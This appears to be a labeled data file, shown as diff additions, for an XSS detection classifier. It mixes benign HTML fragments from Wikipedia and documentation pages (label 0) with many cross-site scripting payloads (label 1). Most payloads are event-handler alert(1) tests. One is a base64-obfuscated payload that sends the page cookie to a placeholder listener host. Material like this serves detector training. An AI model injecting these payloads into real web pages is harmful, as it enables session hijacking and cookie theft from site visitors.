+"	 </span> <span class=""reference-text""><cite class=""citation journal"">N. Aletras; D. Tsarapatsanis; D. Preotiuc-Pietro; V. Lampos (2016). ""Predicting judicial decisions of the European Court of Human Rights: a Natural Language Processing perspective"". <i>PeerJ Computer Science </i>. <b>2 </b>: e93. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.7717%2Fpeerj-cs.93"">10.7717/peerj-cs.93 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=PeerJ+Computer+Science&amp;rft.atitle=Predicting+judicial+decisions+of+the+European+Court+of+Human+Rights%3A+a+Natural+Language+Processing+perspective&amp;rft.volume=2&amp;rft.pages=e93&amp;rft.date=2016&amp;rft_id=info%3Adoi%2F10.7717%2Fpeerj-cs.93&amp;rft.au=N.+Aletras&amp;rft.au=D.+Tsarapatsanis&amp;rft.au=D.+Preotiuc-Pietro&amp;rft.au=V.+Lampos&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<code onmousedown=""alert(1)"">test</code>",1
+"	 </span> <span class=""toctext"">Computational intelligence and soft computing ",0
+"<em oncopy=""alert(1)"" contenteditable>test</em>",1
+<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,1
+"<div role=""navigation"" class=""navbox authority-control"" aria-labelledby=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" style=""padding:3px""><table class=""nowraplinks hlist navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th id=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Help:Authority_control"" title=""Help:Authority control"">Authority control </a> <a href=""https://www.wikidata.org/wiki/Q11660"" title=""Edit this at Wikidata""><img alt=""Edit this at Wikidata"" src=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/10px-OOjs_UI_icon_edit-ltr-progressive.svg.png"" decoding=""async"" width=""10"" height=""10"" style=""vertical-align: text-top"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/15px-OOjs_UI_icon_edit-ltr-progressive.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/20px-OOjs_UI_icon_edit-ltr-progressive.svg.png 2x"" data-file-width=""20"" data-file-height=""20"" /> </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+<abbr onpointermove=alert(1)>XSS</abbr>,1
+"	 </span> <span class=""reference-text"">The act of doling out rewards can itself be formalized or automated into a ""<a href=""/wiki/Reward_function"" class=""mw-redirect"" title=""Reward function"">reward function </a>"". ",0
+"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",1
+"	 </span> </a>&#32;<span class=""metadata""> &#8211; <a href=""/wiki/Talk:Artificial_intelligence#Dubious"" title=""Talk:Artificial intelligence"">discuss </a> ",0
+"<li id=""cite_note-contemporary_agi-146""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-contemporary_agi_146-0"">^ </a> </b> ",0
+"<p>Compared with humans, existing AI lacks several features of human ""<a href=""/wiki/Commonsense_reasoning"" title=""Commonsense reasoning"">commonsense reasoning </a>""; most notably, humans have powerful mechanisms for reasoning about ""<a href=""/wiki/Na%C3%AFve_physics"" title=""Naïve physics"">naïve physics </a>"" s""<a href=""/wiki/Folk_psychology"" title=""Folk psychology"">folk psychology </a>"" that helps them to interpret natural-language sentences such as ""The city councilmen refused the demonstrators a permit because they advocated violence"". (A generic AI has difficulty discerning whether the ones alleged to be advocating violence are the councilmen or the demonstrators.)<sup id=""cite_ref-81"" class=""reference""><a href=""#cite_note-81"">&#91;78&#93; </a> </sup><sup id=""cite_ref-82"" class=""reference""><a href=""#cite_note-82"">&#91;79&#93; </a> </sup><sup id=""cite_ref-83"" class=""reference""><a href=""#cite_note-83"">&#91;80&#93; </a> </sup> This lack of ""common knowledge"" means that AI often makes different mistakes than humans make, in ways that can seem incomprehensible. For example, existing self-driving cars cannot reason about the location nor the intentions of pedestrians in the exact way that humans do, and instead must use non-human modes of reasoning to avoid accidents.<sup id=""cite_ref-84"" class=""reference""><a href=""#cite_note-84"">&#91;81&#93; </a> </sup><sup id=""cite_ref-85"" class=""reference""><a href=""#cite_note-85"">&#91;82&#93; </a> </sup><sup id=""cite_ref-86"" class=""reference""><a href=""#cite_note-86"">&#91;83&#93; </a> </sup>",0
+"<ul><li><a href=""/wiki/Software_development_process"" title=""Software development process"">Software development process </a> </li>",0
+"<script type=""text/javascript"" src=""https://assets.readthedocs.org/static/javascript/readthedocs-analytics.js""></script>",0
+<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,1
+"<div class=""thumb tright"">",0
+"<area onclick=""alert(1)"">test</area>",1
+"<li><a class=""mw-selflink selflink"">Artificial intelligence </a> </li> </ul>",0
+"<li id=""cite_note-279""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-279"">^ </a> </b> ",0
+"<time draggable=""true"" ondrag=""alert(1)"">test</time>",1
+"<rtc onmouseenter=""alert(1)"">test</rtc>",1
+"<li><a href=""/wiki/Henri_Poincar%C3%A9"" title=""Henri Poincaré"">Henri Poincaré </a> </li>",0
+"<li><a href=""/wiki/Glossary_of_electrical_and_electronics_engineering"" title=""Glossary of electrical and electronics engineering"">Electrical and electronics engineering </a> </li>",0
+"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",1
+"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",1
+"<data oncontextmenu=""alert(1)"">test</data>",1
+"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",1
+<svg><video onload=alert(1)></video>,1
+"<p>Robot designer <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, cyberneticist <a href=""/wiki/Kevin_Warwick"" title=""Kevin Warwick"">Kevin Warwick </a> and inventor <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> have predicted that humans and machines will merge in the future into <a href=""/wiki/Cyborg"" title=""Cyborg"">cyborgs </a> that are more capable and powerful than either.<sup id=""cite_ref-Transhumanism_411-0"" class=""reference""><a href=""#cite_note-Transhumanism-411"">&#91;399&#93; </a> </sup> This idea, called <a href=""/wiki/Transhumanism"" title=""Transhumanism"">transhumanism </a>, has roots in <a href=""/wiki/Aldous_Huxley"" title=""Aldous Huxley"">Aldous Huxley </a> and <a href=""/wiki/Robert_Ettinger"" title=""Robert Ettinger"">Robert Ettinger </a>.",0
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;49 (historical significance) </li> </ul>",0
+<data onpointerup=alert(1)>XSS</data>,1
+"<li class=""toclevel-1 tocsection-72""><a href=""#References""><span class=""tocnumber"">13 ",0
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,1
+<strike id=x tabindex=1 onfocusin=alert(1)></strike>,1
+"<style>:target {color:red;}</style><menu id=x style=""transition:color 1s"" ontransitionend=alert(1)></menu>",1
+"<input draggable=""true"" ondragleave=""alert(1)"">test</input>",1
+"<image onpaste=""alert(1)"" contenteditable>test</image>",1
+<progress onpointerdown=alert(1)>XSS</progress>,1
+"<del onkeyup=""alert(1)"" contenteditable>test</del>",1
+<strike id=x tabindex=1 onactivate=alert(1)></strike>,1
+"<legend draggable=""true"" ondrag=""alert(1)"">test</legend>",1
+<rp id=x tabindex=1 onfocusin=alert(1)></rp>,1
+"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>",1
+"<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Hans Moravec </a>, <a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id=""cite_ref-Brain_simulation_153-1"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup> </dd> </dl>",0
+"<li id=""cite_note-Applications_of_natural_language_processing-122""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Applications_of_natural_language_processing_122-0"">^ </a> </b> ",0
+"	 </span> <span class=""cs1-visible-error error citation-comment"">Missing or empty <code class=""cs1-code"">&#124;title= </code> (<a href=""/wiki/Help:CS1_errors#citation_missing_title"" title=""Help:CS1 errors"">help </a>) ",0
+"<iframe draggable=""true"" ondragend=""alert(1)"">test</iframe>",1
+<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,1
+"<h2><span class=""mw-headline"" id=""In_fiction"">In fiction ",0
+"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1
+"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",1
+<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,1
+url(javascript:alert('')),1
+"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",1
+"<div oncut=""alert(1)"" contenteditable>test</div>",1
+"<iframe onmousemove=""alert(1)"">test</iframe>",1
+"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D""></A>",1
+"<li><a href=""/wiki/Intentionality"" title=""Intentionality"">Intentionality </a> </li>",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/debug.html"">Debugging Spiders</a></li>",0
+"<kbd onmouseout=""alert(1)"">test</kbd>",1
+"<content onbeforecut=""alert(1)"" contenteditable>test</content>",1
+"<li id=""cite_note-284""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-284"">^ </a> </b> ",0
+<tt onpointerout=alert(1)>XSS</tt>,1
+"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",1
+"	 </span> </sup> possibly involving <a href=""/wiki/Reinforcement_learning#Inverse_reinforcement_learning"" title=""Reinforcement learning"">inverse reinforcement learning </a>.<sup id=""cite_ref-HC_369-1"" class=""reference""><a href=""#cite_note-HC-369"">&#91;358&#93; </a> </sup><sup class=""reference"" style=""white-space:nowrap;"">:<span>191-193 ",0
+<marquee onpointerenter=alert(1)>XSS</marquee>,1
+Classifier performance:,0
+"<span draggable=""true"" ondrag=""alert(1)"">test</span>",1
+"<xmp onmousedown=""alert(1)"">test</xmp>",1
+"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",1
+"<tbody ondblclick=""alert(1)"">test</tbody>",1
+"<listing oncopy=""alert(1)"" contenteditable>test</listing>",1
+"<li class=""toclevel-3 tocsection-23""><a href=""#Computational_intelligence_and_soft_computing""><span class=""tocnumber"">5.3.2 ",0
+"        <span class=""commit"">",0
+"<fieldset onmouseout=""alert(1)"">test</fieldset>",1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;341–344, </li>",0
+"<img onload=""eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"">",1
+<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,1
+"<strong onbeforecopy=""alert(1)"" contenteditable>test</strong>",1
+<tbody onpointerenter=alert(1)>XSS</tbody>,1
+"<li><a href=""/wiki/Mind"" title=""Mind"">Mind </a> </li>",0
+<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,1
+"<IMG onmouseover=""alert('xxs')"">",1
+"<li><a href=""/wiki/Computer_accessibility"" title=""Computer accessibility"">Accessibility </a> </li> </ul>",0
+"<output draggable=""true"" ondrag=""alert(1)"">test</output>",1
+"<li><a href=""/wiki/Walter_Bradford_Cannon"" title=""Walter Bradford Cannon"">Walter Bradford Cannon </a> </li>",0
+"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;591–632 </li> </ul>",0
+"<acronym onclick=""alert(1)"">test</acronym>",1
+"<plaintext onmouseover=""alert(1)"">test</plaintext>",1
+" </p><p>Concern over risk from artificial intelligence has led to some high-profile donations and investments. A group of prominent tech titans including <a href=""/wiki/Peter_Thiel"" title=""Peter Thiel"">Peter Thiel </a>, Amazon Web Services and Musk have committed $1 billion to <a href=""/wiki/OpenAI"" title=""OpenAI"">OpenAI </a>, a nonprofit company aimed at championing responsible AI development.<sup id=""cite_ref-370"" class=""reference""><a href=""#cite_note-370"">&#91;359&#93; </a> </sup> The opinion of experts within the field of artificial intelligence is mixed, with sizable fractions both concerned and unconcerned by risk from eventual superhumanly-capable AI.<sup id=""cite_ref-371"" class=""reference""><a href=""#cite_note-371"">&#91;360&#93; </a> </sup> Other technology industry leaders believe that artificial intelligence is helpful in its current form and will continue to assist humans. Oracle CEO <a href=""/wiki/Mark_Hurd"" title=""Mark Hurd"">Mark Hurd </a> has stated that AI ""will actually create more jobs, not less jobs"" as humans will be needed to manage AI systems.<sup id=""cite_ref-372"" class=""reference""><a href=""#cite_note-372"">&#91;361&#93; </a> </sup> Facebook CEO <a href=""/wiki/Mark_Zuckerberg"" title=""Mark Zuckerberg"">Mark Zuckerberg </a> believes AI will ""unlock a huge amount of positive things,"" such as curing disease and increasing the safety of autonomous cars.<sup id=""cite_ref-373"" class=""reference""><a href=""#cite_note-373"">&#91;362&#93; </a> </sup> In January 2015, Musk donated $10 million to the <a href=""/wiki/Future_of_Life_Institute"" title=""Future of Life Institute"">Future of Life Institute </a> to fund research on understanding AI decision making. The goal of the institute is to ""grow wisdom with which we manage"" the growing power of technology. Musk also funds companies developing artificial intelligence such as <a href=""/wiki/DeepMind"" title=""DeepMind"">DeepMind </a> and <a href=""/wiki/Vicarious_(company)"" title=""Vicarious (company)"">Vicarious </a> to ""just keep an eye on what's going on with artificial intelligence.<sup id=""cite_ref-374"" class=""reference""><a href=""#cite_note-374"">&#91;363&#93; </a> </sup> I think there is potentially a dangerous outcome there.""<sup id=""cite_ref-375"" class=""reference""><a href=""#cite_note-375"">&#91;364&#93; </a> </sup><sup id=""cite_ref-376"" class=""reference""><a href=""#cite_note-376"">&#91;365&#93; </a> </sup>",0
+"<li><a href=""/wiki/Wolfram_Alpha"" class=""mw-redirect"" title=""Wolfram Alpha"">Wolfram Alpha </a><span class=""nowrap"">&#160; ",0
+"<ruby onmouseleave=""alert(1)"">test</ruby>",1
+"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",1
+"	 </span>"". <i>SIGART Newsletter </i> (37): 28–29. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1145%2F1056777.1056779"">10.1145/1056777.1056779 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=SIGART+Newsletter&amp;rft.atitle=Correction+to+%22A+Formal+Basis+for+the+Heuristic+Determination+of+Minimum+Cost+Paths%22&amp;rft.issue=37&amp;rft.pages=28-29&amp;rft.date=1972&amp;rft_id=info%3Adoi%2F10.1145%2F1056777.1056779&amp;rft.aulast=Hart&amp;rft.aufirst=P.+E.&amp;rft.au=Nilsson%2C+N.+J.&amp;rft.au=Raphael%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+	 </span> </h3>,0
+"<li><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Stuart J. Russell </a> </li>",0
+"<menuitem onkeypress=""alert(1)"" contenteditable>test</menuitem>",1
+"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
+"<li><a href=""/wiki/Entertainment_robot"" title=""Entertainment robot"">Entertainment </a> </li>",0
+		 </div> </div>,0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;885–892 </li> </ul>",0
+"	 </span> <span class=""reference-text""><cite class=""citation news"">Lohr, Steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""Robots Will Take Jobs, but Not as Fast as Some Fear, New Report Says"" </a>. <i>The New York Times </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0
+<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,1
+"<tr onmousedown=""alert(1)"">test</tr>",1
+" </p><p>In 2019, the tech city of Bengaluru in India is set to deploy AI managed traffic signal systems across the 387 traffic signals in the city. This system will involve use of cameras to ascertain traffic density and accordingly calculate the time needed to clear the traffic volume which will determine the signal duration for vehicular traffic across streets.<sup id=""cite_ref-327"" class=""reference""><a href=""#cite_note-327"">&#91;316&#93; </a> </sup>",0
+"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Mental representation </a> </li>",0
+<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>,1
+<template onpointerleave=alert(1)>XSS</template>,1
+"<rb oncontextmenu=""alert(1)"">test</rb>",1
+"<li><a href=""/wiki/Ubiquitous_computing"" title=""Ubiquitous computing"">Ubiquitous computing </a> </li>",0
+<cite onpointerover=alert(1)>XSS</cite>,1
+"<pre ondblclick=""alert(1)"">test</pre>",1
+"	 <div id=""John_McCarthy"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0
+"<menu onmouseout=""alert(1)"">test</menu>",1
+"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Jordan, M. I.; Mitchell, T. M. (16 July 2015). ""Machine learning: Trends, perspectives, and prospects"". <i>Science </i>. <b>349 </b> (6245): 255–260. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2015Sci...349..255J"">2015Sci...349..255J </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aaa8415"">10.1126/science.aaa8415 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/26185243"">26185243 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Machine+learning%3A+Trends%2C+perspectives%2C+and+prospects&amp;rft.volume=349&amp;rft.issue=6245&amp;rft.pages=255-260&amp;rft.date=2015-07-16&amp;rft_id=info%3Apmid%2F26185243&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aaa8415&amp;rft_id=info%3Abibcode%2F2015Sci...349..255J&amp;rft.aulast=Jordan&amp;rft.aufirst=M.+I.&amp;rft.au=Mitchell%2C+T.+M.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;678–710, </li>",0
+<blockquote onpointerdown=alert(1)>XSS</blockquote>,1
+"<samp draggable=""true"" ondragstart=""alert(1)"">test</samp>",1
+"<span onmouseleave=""alert(1)"">test</span>",1
+<style>//*{x:expression(alert(//))}//<style></style> ,1
+"	 </span> <span class=""reference-text"">Arntz, Melanie, Terry Gregory, and Ulrich Zierahn. ""The risk of automation for jobs in OECD countries: A comparative analysis."" OECD Social, Employment, and Migration Working Papers 189 (2016). p. 33. ",0
+<video onpointerout=alert(1)>XSS</video>,1
+<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,1
+"<li><span class=""nowrap""><a href=""/wiki/Integrated_Authority_File"" title=""Integrated Authority File"">GND </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://d-nb.info/gnd/4033447-8"">4033447-8 </a> ",0
+"<p>It is possible to use AI to predict or generalize the behavior of customers from their <a href=""/wiki/Digital_footprints"" class=""mw-redirect"" title=""Digital footprints"">digital footprints </a> in order to target them with personalized promotions or build customer personas automatically.<sup id=""cite_ref-Matz_et_al_2017_340-0"" class=""reference""><a href=""#cite_note-Matz_et_al_2017-340"">&#91;329&#93; </a> </sup> A documented case reports that online gambling companies were using AI to improve customer targeting.<sup id=""cite_ref-341"" class=""reference""><a href=""#cite_note-341"">&#91;330&#93; </a> </sup>",0
+<discard onpointerleave=alert(1)>XSS</discard>,1
+"<li><a href=""#CITEREFKolata1982"">Kolata 1982 </a>, a paper in <i><a href=""/wiki/Science_(journal)"" title=""Science (journal)"">Science </a> </i>, which describes <a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy's </a> indifference to biological models. Kolata quotes McCarthy as writing: ""This is AI, so we don't care if it's psychologically real""<cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://books.google.com/books?id=PEkqAAAAMAAJ"">""Science"" </a>. August 1982. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Science&amp;rft.date=1982-08&amp;rft_id=https%3A%2F%2Fbooks.google.com%2Fbooks%3Fid%3DPEkqAAAAMAAJ&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<head onmousemove=""alert(1)"">test</head>",1
+"	 </span> <span class=""toctext"">Cybernetics and brain simulation ",0
+<rt onpointerover=alert(1)>XSS</rt>,1
+<wbr onpointerleave=alert(1)>XSS</wbr>,1
+<label onpointerenter=alert(1)>XSS</label>,1
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possible developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possible+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",1
+"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",1
+"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",1
+"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></footer>",1
+"<hr draggable=""true"" ondragend=""alert(1)"">test</hr>",1
+<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>,1
+"<font onbeforepaste=""alert(1)"" contenteditable>test</font>",1
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>,1
+http://1113982867/,1
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=Pentagon+Wants+Silicon+Valley%27s+Help+on+A.I.&amp;rft.date=2018-03-15&amp;rft.aulast=Metz&amp;rft.aufirst=Cade&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2018%2F03%2F15%2Ftechnology%2Fmilitary-artificial-intelligence.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<noscript onmousedown=""alert(1)"">test</noscript>",1
+<dir id=x tabindex=1 onactivate=alert(1)></dir>,1
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=65"" title=""Edit section: Superintelligence"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"          <dd><a href=""//docs.scrapy.org/_/downloads/en/latest/epub/"">epub</a></dd>       ",0
+"<progress onmouseleave=""alert(1)"">test</progress>",1
+"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",1
+"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;100–101, who writes that there are ""two major branches of artificial intelligence: one aimed at producing intelligent behavior regardless of how it was accomplished, and the other aimed at modeling intelligent processes found in nature, particularly human ones."" </li>",0
+<style onpointerup=alert(1)>XSS</style>,1
+"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",1
+	 </span> 2016 ,0
+"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
+"	 <div class=""thumbinner"" style=""width:362px;""><a href=""/wiki/File:EM_Clustering_of_Old_Faithful_data.gif"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/6/69/EM_Clustering_of_Old_Faithful_data.gif"" decoding=""async"" width=""360"" height=""309"" class=""thumbimage"" data-file-width=""360"" data-file-height=""309"" /> </a>  <div class=""thumbcaption""><a href=""/wiki/Expectation-maximization"" class=""mw-redirect"" title=""Expectation-maximization"">Expectation-maximization </a> clustering of <a href=""/wiki/Old_Faithful"" title=""Old Faithful"">Old Faithful </a> eruption data starts from a random guess but then successfully converges on an accurate clustering of the two physically distinct modes of eruption. </div> </div> </div>",0
+"<li><cite class=""citation journal"">Serenko, Alexander (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.aserenko.com/papers/JOI_Serenko_AI_Journal_Ranking_Published.pdf"">""The development of an AI journal ranking based on the revealed preference approach"" </a> <span class=""cs1-format"">(PDF) ",0
+"<bdi onmousedown=""alert(1)"">test</bdi>",1
+<body ontouchend=alert(1)> ,1
+"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",1
+"<tt onmousemove=""alert(1)"">test</tt>",1
+"<strong onmouseover=""alert(1)"">test</strong>",1
+"Pamela <a href=""#CITEREFMcCorduck2004"">McCorduck (2004 </a>, pp.&#160;424) writes of ""the rough shattering of AI in subfields—vision, natural language, decision theory, genetic algorithms, robotics&#160;... and these with own sub-subfield—that would hardly have anything to say to each other."" ",0
+"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",1
+"<ul><li><a href=""/wiki/Cellular_evolutionary_algorithm"" title=""Cellular evolutionary algorithm"">Cellular evolutionary algorithm </a> </li>",0
+"<a onmouseout=""alert(1)"">test</a>",1
+"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",1
+<base onpointerout=alert(1)>XSS</base>,1
+"<menuitem onmousemove=""alert(1)"">test</menuitem>",1
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Goertzel, Ben; Lian, Ruiting; Arel, Itamar; de Garis, Hugo; Chen, Shuo (December 2010). ""A world survey of artificial brain projects, Part II: Biologically inspired cognitive architectures"". <i>Neurocomputing </i>. <b>74 </b> (1–3): 30–49. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.neucom.2010.08.012"">10.1016/j.neucom.2010.08.012 </a>. </cite><span 